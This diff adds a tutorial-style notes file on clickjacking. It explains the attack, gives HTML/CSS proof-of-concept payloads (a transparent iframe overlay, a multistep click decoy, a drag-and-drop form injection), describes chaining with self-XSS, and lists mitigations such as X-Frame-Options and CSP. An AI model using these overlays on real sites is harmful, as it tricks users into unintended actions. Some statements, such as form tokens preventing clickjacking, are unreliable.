@@ -1,1 +1,185 @@
+CLICKJACKING :- Clickjacking is a type of cyber attack that involves tricking a user into clicking on a button or link on a website, 
+often by displaying the button or link on top of another website or application that the user trusts. The user may not realize they 
+are clicking on the button or link because it appears as part of a trusted website or application.
+
+Clickjacking can be used for various malicious purposes, such as stealing personal information, installing malware, or causing 
+the user to make unintended actions (such as liking a post or making a purchase). It can be difficult for users to protect themselves 
+against clickjacking, as the attack is often disguised and difficult to detect. However, website developers can take steps to prevent 
+clickjacking by implementing measures such as frame-busting and content security policies.
+
+==> IT can be prevented by using csp (content security polcies):-
+
+Clickjacking is a type of cyber attack that tricks users into clicking on a button or link on a website without their 
+knowledge or consent. It is often done by displaying the button or link on top of another website or application that the 
+user trusts, so they may not realize they are clicking on something potentially malicious.
+
+For example, a clickjacker might create a fake login page that looks like a legitimate website and trick users into entering their 
+login credentials. Alternatively, the clickjacker might create a fake “like” button and trick users into liking a post or page they 
+normally wouldn’t. Clickjacking can be used for various malicious purposes and can be difficult for users to protect themselves against.
+
+A clickjacking attack is a type of attack that tricks a user into clicking on a malicious link or button by disguising it as a 
+legitimate one. This can be done by overlaying the malicious link or button on top of a legitimate one or creating a transparent 
+layer over the page that captures clicks intended for the underlying page.
+
+Clickjacking Examples?
+1. Stealing personal information: A clickjacker might create a fake login page that looks like a legitimate website, tricking a 
+user into entering their login credentials. The clickjacker can then use this information to gain access to the user’s account.
+2. Installing malware: A clickjacker might create a fake “download” button and trick users into downloading and installing malware 
+on their devices.
+3. Causing unintended actions: A clickjacker might create a fake “like” button and trick users into liking a post or page they 
+usually wouldn’t.
+4. Displaying unwanted advertisements: A clickjacker might create a fake “click here to continue” button and trick a user into 
+clicking on an advertisement.
+
+clickjacking attacks can be difficult to detect. The malicious button or link is often disguised and 
+appears as part of a trusted website or application.
+
+This type of attack can be particularly effective because the victim may not realize that they are clicking on a malicious link 
+or button and may assume that they are interacting with a legitimate website.
+
+ ======================>>>>>>>>>>>>>> Creating a clickjacking attack...................................................................
+
+Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on 
+the decoy website. An example using the style tag and parameters is as follows:
+
+EX :- Payload :-
+<html>
+<head>
+<title>Clickjacking</title>
+</head>
+<body>
+<p>Website is vulnerable to clickjacking!</p>
+<iframe src="https://adityas-website.com" width="500" height="500"></iframe>
+</body>
+</html>
+
+# Multistep Payload
+iframe {
+       position:relative;
+       width: 500px;
+       height: 500px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   .firstClick, .secondClick {
+       position:absolute;
+       top:330px;
+       left:60px;
+       z-index: 1;
+   }
+   .secondClick {
+       left:210px;
+   }
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://adityaswebsite.com"></iframe>
+
+# Just a little dragging and dropping and a click (Drag&Drop)
+
+
+You can utilize Drag&Drop to get the user to fill out a form without having to reveal sensitive information such as an 
+email address or password.
+<html>
+<head>
+<style>
+#payload{
+position: absolute;
+top: 20px;
+}
+iframe{
+width: 1000px;
+height: 675px;
+border: none;
+}
+.xss{
+position: fixed;
+background: #F00;
+}
+</style>
+</head>
+<body>
+<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
+<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
+<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
+<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3
+"src="https://adityaswebsite.com"></iframe>
+<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
+</body>
+</html>
+
+
+Cross-Site Scripting and Clickjacking
+If you know of a clickable XSS attack vector and the page is susceptible to clickjacking, you can exploit this knowledge to deceive
+the user into triggering the XSS attack.
+You discovered a self XSS in the account’s sensitive information (details only you can set and read). Clickjacking allows you to 
+prepopulate the form with the GET parameters on the page where you can enter these details.
+The attacker might then use a Clickjacking attack to redirect the user to that page, where the XSS payload is already prefilled in the 
+form. Because of this, the XSS will be carried out when the form is submitted with the altered data.
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>MITIGATION OF CLICKJACKING...........................
+
+1) client side method..
+a) Frame busting: This involves adding a JavaScript code to the page that checks whether the page is being loaded inside 
+a frame, and if so, it breaks out of the frame to display the page in the top-level window. This prevents the page from being 
+used in a clickjacking attack.
+
+b) X-Frame-Options header: This is an HTTP response header that can be used to instruct the browser whether or not a page 
+can be displayed in a frame. The possible values for this header are “DENY”, “SAMEORIGIN”, or a specific URL. If the value is “DENY”, 
+the page cannot be displayed in a frame; if the value is “SAMEORIGIN”, the page can only be displayed in a frame if the frame is on the 
+same domain as the page. If the value is a specific URL, the page can only be displayed in a frame if the frame is on that specific URL.
+
+2) server side methods :-
+a)Token-based authentication: This involves adding a unique token to each form submission and then checking for the presence of the 
+token on the server before processing the submission. This prevents an attacker from being able to use a clickjacking attack to trick 
+a user into submitting a form on a page controlled by the attacker.
+
+b) CAPTCHA: This challenge-response test is used to determine whether the user is a human or a computer. By requiring the user to 
+solve a CAPTCHA before they can submit a form, it becomes much more difficult for an attacker to use a clickjacking attack to submit 
+a form on the user’s behalf.
+
+c) Security headers: In addition to the X-Frame-Options header, several other security headers can help mitigate the risk of 
+clickjacking attacks. These headers include the Content-Security-Policy header, which can be used to specify which domains are 
+allowed to load resources on the page, and the X-Content-Type-Options header, which can be used to prevent content type sniffing.
+
+==> Note :- It’s important to note that no single method prevents clickjacking attacks, so it’s generally recommended to use a 
+            combination of these methods to provide multiple layers of protection.
+
+Mitigating clickjacking with X-Frame-Options response header :::::: ----------------
+
+The X-Frame-Options response header is a useful tool for mitigating clickjacking attacks by allowing web developers to specify 
+whether a page can be displayed in a frame, iframe, or object.
+
+To use the X-Frame-Options header, you need to add it to the HTTP response headers of the page you want to protect. 
+The possible values for this header are:
+
+“DENY”: The page cannot be displayed in a frame.
+“SAMEORIGIN”: The page can only be displayed in a frame on the same origin as the page.
+“ALLOW-FROM Uri”: The page can only be displayed in a frame on the specified origin.
+For example, if you want to prevent your page from being displayed in a frame, you can add the following header to the HTTP response:
+
+X-Frame-Options: DENY
+If you only want to allow your page to be displayed in a frame on the same origin as the page, you can use the following header:
+
+X-Frame-Options: SAMEORIGIN
+And if you want to allow your page to be displayed in a frame on a specific origin, you can use the “ALLOW-FROM” value 
+and specify the allowed origin:
+
+X-Frame-Options: ALLOW-FROM https://example.com
+It’s important to note that the X-Frame-Options header is not supported by all browsers, so it’s generally recommended to use 
+it in conjunction with other clickjacking mitigation methods, such as frame-busting and Content Security Policy (CSP) headers.
+
+Awareness
+User education: Users can protect themselves against clickjacking attacks by being cautious when clicking on buttons or links,
+especially when unfamiliar with the website or application. They should also keep their operating system and web browser up to 
+date, as these updates often include security fixes that can help protect against clickjacking and other types of cyber attacks.
+
+Regular testing: Regularly testing websites and applications for vulnerabilities can help identify and fix potential clickjacking 
+vulnerabilities before they can be exploited. This can be done through manual testing or using automated tools.
+
+It’s also important for users to be cautious when clicking on buttons or links online, especially if they are unfamiliar with the website or 
+if the website seems suspicious. Users should be wary of clicking on buttons or links that appear as part of a trusted website or application, 
+as they may actually be part of a clickjacking attack.
+
 
